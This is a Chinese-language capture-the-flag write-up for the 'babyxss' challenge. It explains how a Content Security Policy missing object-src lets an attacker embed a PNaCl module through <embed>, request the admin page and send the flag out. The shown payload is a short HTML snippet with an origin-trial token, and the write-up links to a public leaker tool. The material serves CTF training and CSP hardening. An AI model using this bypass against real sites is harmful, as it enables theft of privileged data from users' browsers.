# babyxss

## 题目简述

题目表面是 XSS：`/fd.php` 的 `q` 参数可完全控制 HTML 内容且标签未转义，但 CSP 禁止脚本、图片、iframe 和网络连接。关键遗漏是没有设置 `object-src`，因此仍可通过 `object`/`embed` 嵌入浏览器组件。结合提示检查 Chrome 组件后，可以使用 PNaCl 模块请求管理员页面并把 flag 带出；由于公开 Web 上 PNaCl 需要 Origin Trial，还需要申请 token 并以 HTTPS 提供模块。

题目资料地址：https://github.com/frankli0324/d3ctf2019-babyxss

`app/app.py` 中 `/fd.php` 直接返回 `q` 参数，并设置 `img-src 'none'; script-src 'none'; frame-src 'none'; connect-src 'none'`，确实遗漏了 `object-src`。report 入口要求 URL 以 `https://{request.host}` 开头，并要求 `md5(captcha)[:5]` 命中 session 中的验证码；`/admin.php` 只接受 `x-forwarded-for == redis host` 的内网请求，返回的 flag 为 `sha256(token + secret)`，其中 `token` 取自子域名前缀。这些限制解释了 payload 为什么必须走同源 HTTPS、PNaCl/`embed` 和管理员浏览器上下文。

## 解题过程

选手可以通过对/fd.php的参数q的控制完全控制其内容且标签未转义  
但是由于CSP的原因无法执行js且不能用iframe

```perl
img-src 'none'; script-src 'none'; frame-src 'none'; connect-src 'none'
```

丢到csp-evaluator里头可以发现没有设置object-src  
object-src允许嵌入object  
根据hint去 `chrome://components` 里头找有什么可以利用的组件  
最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)  
通过一些搜索可以发现pNaCl可以跑C/C++

可以编写一个Leak去请求admin.php，获取flag，然后再将flag带出来  
准备 Native Client SDK 或已有的 NaCl/PNaCl 构建环境，再配合 Leak 代码编译出 `.nmf` 清单和 `.pexe` 模块，放到自己的服务器上然后尝试:

```html
<embed src="[http-origin]/url_loader.nmf" type="application/x-pnacl">
```

轻松获得了一个Mixed Content呢（（毒瘤出题人  
上https以后发现:

```csharp
PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled
```

搜索Origin Trial，看新闻：

[https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md](https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md)

Chrome 76 之后，开放 Web 上的 PNaCl 被放到 Origin Trial 后面：开发者需要为自己的 origin 申请 token，并把 token 放到页面的 `origin-trial` meta 或响应头中，浏览器才会在不手动开 flag 的情况下启用 PNaCl。PNaCl 模块通常由 `.nmf` 清单引用 `.pexe` 文件，页面通过 `<embed type="application/x-pnacl">` 加载；由于 report 页面要求 HTTPS，同源页面里加载 HTTP 模块会被 Mixed Content 拦截，所以模块也必须放在 HTTPS origin 上。

按 Origin Trial 开发指南为自己的 origin 申请 token，最终的payload:

```xml
<meta http-equiv="origin-trial" content="[token]">
<embed src="[https-origin]/url_loader.nmf" type="application/x-pnacl">
```

说是xss你还真信啊.jpg  
其实网上有现成的 [Leak](https://github.com/shhnjk/PNaCl_Leaker)  
总结起来就是object-src missing, html controllable的情况。虽然网上其实已经有了exp，但是貌似还是有很多人没有碰到过。

## 方法总结

- 核心技巧：CSP 禁掉 `script-src` 不等于 HTML 注入不可利用，缺失 `object-src` 时可检查插件、PNaCl、PDF、SVG 等可嵌入执行面。
- 识别信号：页面 HTML 完全可控、CSP 很严但没有 `object-src`，且题目提示浏览器组件时，应考虑 `embed`/`object` 绕过传统 XSS 执行模型。
- 复用要点：PNaCl 在现代 Chrome 上受 Mixed Content 和 Origin Trial 限制，复现时必须使用 HTTPS 并提供有效 origin-trial token；payload 的核心是让模块读取同源管理员资源并外带结果。

